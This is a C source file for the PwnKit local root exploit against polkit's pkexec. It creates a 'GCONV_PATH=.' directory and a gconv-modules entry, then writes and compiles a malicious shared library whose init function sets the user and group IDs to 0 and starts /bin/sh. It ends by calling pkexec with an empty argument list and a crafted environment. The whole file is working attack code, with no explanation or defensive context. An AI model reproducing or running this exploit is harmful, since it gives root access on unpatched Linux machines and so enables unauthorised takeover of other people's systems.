#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char	*shell =
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n"
	"#include <gconv.h>\n"
	"void	gconv(void) { }\n"
	"void	gconv_init(void) { setuid(0); setgid(0); seteuid(0); setegid(0);\n"
	"system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"exit(0);\n"
	"}";

int	main(void)
{
	FILE	*file;
	char	*arg[] = { NULL };
	char	*env[] = {
		"pwnkit",
		"PATH=GCONV_PATH=.",
		"CHARSET=PWNKIT",
		"SHELL=pwnkit",
		NULL
	};

	system("mkdir -p 'GCONV_PATH=.'");
	system("touch 'GCONV_PATH=./pwnkit'");
	system("chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit");
	system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	file = fopen("pwnkit/pwnkit.c", "w");
	fprintf(file, "%s", shell);
	fclose(file);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	execve("/usr/bin/pkexec", arg, env);
}
